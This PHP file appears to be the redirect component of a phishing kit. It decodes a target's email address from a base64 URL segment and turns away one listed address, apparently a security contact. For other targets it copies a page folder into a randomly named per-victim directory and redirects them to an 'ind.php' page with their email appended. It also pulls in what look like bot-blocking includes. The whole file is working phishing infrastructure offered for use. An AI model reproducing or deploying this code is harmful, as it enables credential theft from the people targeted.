<?php

include('class/bk.php');
include('class/ant.php');
include('class/b.php');
include('class/bo.php');
include('class/bt.php');


	$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$urls = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$url=explode(';',$urls);
   
$dem=base64_decode($url[1]);
$urldomain=explode('@',$dem);

$gdom= str_replace("@","-",$dem);


//BANNED EMAILS/////////
$marks = array('sales.australia@arrowasia.com'); 
  
if (in_array($dem, $marks)) 
  { 
    $loc = "http://".$urldomain[1] . $redirect;
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: " .$loc. "");
  }
/////////////
  $s1= $url[2];
  $s2= $gdom."_".generateRandomString(100); 
    if (!file_exists($s1)) {
echo "Something went wrong! try again!";	
die;    }  
 

function full_copy( $source, $target ) {
    if ( is_dir( $source ) ) {
        @mkdir( $target );
        $d = dir( $source );
        while ( FALSE !== ( $entry = $d->read() ) ) {
            if ( $entry == '.' || $entry == '..' ) {
                continue;
            }
            $Entry = $source . '/' . $entry; 
            if ( is_dir( $Entry ) ) {
                full_copy( $Entry, $target . '/' . $entry );
                continue;
            }
            copy( $Entry, $target . '/' . $entry );
        }

        $d->close();
    }else {
        copy( $source, $target );
    }
}


if(!empty($s1) && !empty($s2)){
	if($s1!="-"){
full_copy($s1,$s2);
	}
}else{
echo "Something went wrong! try again!";	
die;
}
 
 
if(isset($s1) && $s1=="-"){
// $ind_url="https://reviewcheck.ga/".$s1."/indes.php?echo=".generateRandomString(200).";";//YOUR your ind.php location url
 $ind_url="http://127.0.0.1/allinonepage/".$s1."/indes.php?echo=".generateRandomString(200).";";//YOUR your ind.php location url
}

 
if(isset($s1) && $s1=="g"){
 //$ind_url="https://reviewcheck.ga/".$s2."/ind.php?echo=".generateRandomString(200)."&e=";//YOUR your ind.php location url
 $ind_url="http://127.0.0.1/allinonepage/".$s2."/ind.php?echo=".generateRandomString(200)."&e=";//YOUR your ind.php location url
}


if(isset($s1) && $s1=="o"){
 //$ind_url="https://reviewcheck.ga/".$s2."/ind.php?".generateRandomString(200)."#";//YOUR your ind.php location url
 $ind_url="http://127.0.0.1/allinonepage/".$s2."/ind.php?".generateRandomString(200)."#";//YOUR your ind.php location url
	
	
}
function generateRandomString($nlength) {
	$length = $nlength;
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>


<script>
var 	rooturl = "<?php echo $ind_url; ?>";
var 	finish_url = "<?php echo $url[1]; ?>";
	  
if(finish_url !== null && finish_url !== ''){
   // alert(finish_url);
		 location.replace(rooturl+finish_url);
	 	 setTimeout("window.location.href='"+ rooturl+finish_url+"';", 1000);
}
</script>